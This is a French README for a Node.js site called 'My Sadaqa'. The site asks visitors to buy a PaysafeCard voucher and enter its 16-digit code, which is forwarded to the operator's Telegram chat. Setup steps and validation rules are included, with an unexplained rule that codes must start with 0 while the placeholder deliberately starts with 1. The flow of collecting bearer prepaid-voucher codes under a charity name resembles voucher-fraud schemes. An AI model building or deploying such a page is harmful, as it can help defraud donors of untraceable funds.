# My Sadaqa

Site web pour réceptionner des dons via codes PaysafeCard avec notification Telegram.

## Installation

1. Installer les dépendances :
```bash
npm install
```

2. Créer un fichier `.env` basé sur `.env.example` :
```bash
cp .env.example .env
```

3. Configurer votre bot Telegram :
   - Créez un bot via [@BotFather](https://t.me/botfather) sur Telegram
   - Obtenez votre **BOT_TOKEN**
   - Obtenez votre **CHAT_ID** (envoyez un message à votre bot et visitez `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`)

4. Remplissez le fichier `.env` avec vos informations :
```
TELEGRAM_BOT_TOKEN=votre_token_ici
TELEGRAM_CHAT_ID=votre_chat_id_ici
PORT=3000
```

## Démarrage

```bash
npm start
```

Le site sera accessible sur `http://localhost:3000`

## Fonctionnement

Le site guide le visiteur en 3 étapes :

1. **Accueil** — Message de bienvenue et explication du don
2. **Achat** — Redirection vers Recharge.com pour acheter une recharge PaysafeCard (montant libre)
3. **Code** — Le visiteur saisit son code à 16 chiffres, qui est envoyé sur Telegram

## Validation du code

- Le code doit contenir exactement 16 chiffres
- Le code doit obligatoirement commencer par le chiffre **0**
- L'exemple affiché dans le champ ("1234 5678 9012 3456") commence volontairement par 1
- La validation est effectuée côté client ET côté serveur

## Fonctionnalités

- Interface en 3 étapes (checkout guidé)
- Design professionnel et responsive
- Barre de progression visuelle
- Validation stricte du code
- Notification instantanée sur Telegram
- Aucune donnée bancaire demandée sur le site
